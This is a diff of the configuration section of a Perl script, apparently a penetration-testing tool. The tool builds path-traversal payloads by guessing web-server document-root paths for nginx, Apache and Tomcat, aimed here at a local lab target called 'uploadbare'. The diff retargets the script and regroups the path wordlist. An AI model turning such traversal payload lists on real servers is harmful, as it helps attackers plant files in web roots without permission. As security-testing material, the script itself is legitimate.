@@ -10,8 +10,8 @@ use strict;
 # It is important to specify both short and long name of the target, as its DOC_ROOT is highly likely derived from that value.
 
 # CONFIG SECTION STARTS HERE
-my $target_short='example';
-my $target_long='example.org';
+my $target_short='localhost';
+my $target_long='uploadbare';
 my $filename='test.jpg';
 my $auto_append_traversals=1; # if set to 1, include traversal versions of the document root payloads as well
 my $auto_append_filename=1;   # if set to 1, automatically append the specified filename to each payload
@@ -50,39 +50,58 @@ my @pure_traversals=(
 # nix only list of, if we know the underlying server platform, we can comment out irrelevant paths below
 my @brute_doc_root_prefixes=
  (
+# univeresal docroots
  "/var/www",
- "/usr/local/apache", 
- "/usr/local/apache2", 
- "/usr/local/www/apache22", 
- "/usr/local/www/apache24", 
  "/usr/local/httpd", 
- "/var/www/nginx-default", 
  "/srv/www", 
- "/opt/tomcat5",
- "/opt/tomcat6",
- "/opt/tomcat7",
+ "/var/www/html",
  "/var/www/$target_short", 
+ "/var/www/html/$target_short",
  "/var/www/vhosts/$target_short", 
  "/var/www/virtual/$target_short", 
  "/var/www/clients/vhosts/$target_short", 
  "/var/www/clients/virtual/$target_short", 
+ "/var/www/$target_long", 
+ "/srv/www/$target_long", 
+ "/srv/www/$target_short", 
+ "/var/www/html/$target_long",
+ "/var/www/vhosts/$target_long", 
+ "/var/www/virtual/$target_long", 
+ "/var/www/clients/vhosts/$target_long", 
+ "/var/www/clients/virtual/$target_long", 
+
+# nginx docroots
+ "/var/www/nginx-default", 
+
+# apache docroots
+ "/usr/local/apache", 
+ "/usr/local/apache2", 
+ "/usr/local/www/apache22", 
+ "/usr/local/www/apache24", 
+ "/usr/local/$target_short/apache/www/apache22/$target_short",
+ "/usr/local/apache/www/apache22/$target_short",
+ "/usr/local/$target_long/apache/www/apache22/$target_long",
+ "/usr/local/apache/www/apache22/$target_long",
+
+# tomcat docroots
  "/usr/local/tomcat/webapps/$target_short",
  "/usr/local/tomcat01/webapps/$target_short", 
  "/usr/local/tomcat02/webapps/$target_short",
  "/opt/tomcat5/$target_short",
  "/opt/tomcat6/$target_short",
  "/opt/tomcat7/$target_short",
- "/var/www/$target_long", 
- "/var/www/vhosts/$target_long", 
- "/var/www/virtual/$target_long", 
- "/var/www/clients/vhosts/$target_long", 
- "/var/www/clients/virtual/$target_long", 
  "/usr/local/tomcat/webapps/$target_long",
  "/usr/local/tomcat01/webapps/$target_long", 
  "/usr/local/tomcat02/webapps/$target_long",
- "/opt/tomcat5/$target_long",
- "/opt/tomcat6/$target_long",
- "/opt/tomcat7/$target_long"
+ "/opt/tomcat5/webapps/$target_long",
+ "/opt/tomcat6/webapps/$target_long",
+ "/opt/tomcat7/webapps/$target_long",
+ "/opt/tomcat5/webapps",
+ "/opt/tomcat6/webapps",
+ "/opt/tomcat7/webapps",
+ "/var/lib/tomcat7/webapps",
+ "/var/lib/tomcat7/webapps/$target_long",
+ "/var/lib/tomcat7/webapps/$target_short",
  );
 
 # Suffixes used in brute force search for web server document root
